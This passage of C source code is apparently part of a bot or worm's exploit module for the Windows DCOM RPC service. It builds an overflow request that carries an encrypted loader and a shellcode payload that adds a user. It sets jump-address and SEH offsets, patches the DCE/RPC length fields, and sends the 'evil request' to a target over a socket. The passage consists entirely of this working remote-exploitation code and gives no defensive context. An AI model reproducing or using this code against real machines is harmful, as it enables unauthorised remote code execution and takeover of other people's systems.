	iLoaderSize=encrypt_shellcode(dcom2_loader, sizeof(dcom2_loader), szLoaderBuf, sizeof(szLoaderBuf), NULL);
	
	memcpy(szLoadBuf+iPos,							dcom2_shellcode_buf,	sizeof(dcom2_shellcode_buf)		); iPos+=sizeof(dcom2_shellcode_buf);
//	memcpy(szLoadBuf+DCOM2_SCBUF_OFFSET_SC,			szLoaderBuf,			iLoaderSize						);
	memcpy(szLoadBuf+DCOM2_SCBUF_OFFSET_SC,			dcom2_shellcode_adduser,sizeof(dcom2_shellcode_adduser)	);
	memcpy(szLoadBuf+DCOM2_SCBUF_OFFSET_JMP_ADDR,	&dcom2_my_offsets[0].lJmpAddr,	4						);
	memcpy(szLoadBuf+DCOM2_SCBUF_OFFSET_TOP_SEH, 	&dcom2_my_offsets[0].lTopSEH,	4						);
	iLoadSize=iPos; iPos=0;

	// Build the request
	memcpy(szReqBuf+iPos,	dcom2_request1,		sizeof(dcom2_request1)-1	); iPos+=sizeof(dcom2_request1)-1;
	memcpy(szReqBuf+iPos,	dcom2_request2,		sizeof(dcom2_request2)-1	); iPos+=sizeof(dcom2_request2)-1;
	memcpy(szReqBuf+iPos,	szLoadBuf,			iLoadSize					); iPos+=iLoadSize;
	memcpy(szReqBuf+iPos,	dcom2_request3,		sizeof(dcom2_request3)-1	); iPos+=sizeof(dcom2_request3)-1;
	memcpy(szReqBuf+iPos,	dcom2_request4,		sizeof(dcom2_request4)-1	); iPos+=sizeof(dcom2_request4)-1;
	iReqSize=iPos; iPos=0;

	pTemp=szReqBuf+sizeof(dcom2_request1)-1; // Fill the request with the right sizes
	*(unsigned long*)(pTemp)		= *(unsigned long*)(pTemp)		+ iLoadSize / 2;
	*(unsigned long*)(pTemp+8)		= *(unsigned long*)(pTemp+8)	+ iLoadSize / 2; pTemp=szReqBuf;
    *(unsigned long*)(pTemp+8)		= *(unsigned long*)(pTemp+8)	+ iLoadSize - 12;
	*(unsigned long*)(pTemp+16)		= *(unsigned long*)(pTemp+16)	+ iLoadSize - 12;
	*(unsigned long*)(pTemp+128)	= *(unsigned long*)(pTemp+128)	+ iLoadSize - 12;
	*(unsigned long*)(pTemp+132)	= *(unsigned long*)(pTemp+132)	+ iLoadSize - 12;
	*(unsigned long*)(pTemp+180)	= *(unsigned long*)(pTemp+180)	+ iLoadSize - 12;
	*(unsigned long*)(pTemp+184)	= *(unsigned long*)(pTemp+184)	+ iLoadSize - 12;
	*(unsigned long*)(pTemp+208)	= *(unsigned long*)(pTemp+208)	+ iLoadSize - 12;
	*(unsigned long*)(pTemp+396)	= *(unsigned long*)(pTemp+396)	+ iLoadSize - 12;

    char szAssocGroup[4];

	// Connect to the server
	int iErr=connect(sSocket, (sockaddr*)&ssin, sizeof(sockaddr_in));
	if(iErr==-1) // Connect failed, exit
	{	xClose(sSocket); return false; }

	// Send the bind string
	if(xWrite(sSocket, dcom2_bindstr, sizeof(dcom2_bindstr)-1)==SOCKET_ERROR) { xClose(sSocket); return false; }
	// Read reply
	if(xRead(sSocket, szRecvBuf, sizeof(szRecvBuf))==SOCKET_ERROR) { xClose(sSocket); return false; }
	// Check for DCE_PKT_BINDACK
//	if(szRecvBuf[2]!=DCE_PKT_BINDACK) { xClose(sSocket); return false; }
	// Store the association group for later usage
    memcpy(szAssocGroup, szRecvBuf+20, 4);

	// Send the evil request
	if(xWrite(sSocket, szReqBuf, iReqSize)==SOCKET_ERROR) { xClose(sSocket); return false; }
	// Read reply
	if(xRead(sSocket, szRecvBuf, sizeof(szRecvBuf))==SOCKET_ERROR) { xClose(sSocket); return false; }
	// Check for DCE_PKT_FAULT
	if(szRecvBuf[2]==DCE_PKT_FAULT) { xClose(sSocket); return false; }

	// Close the socket that was once funky fresh
	xClose(sSocket); return true;
}
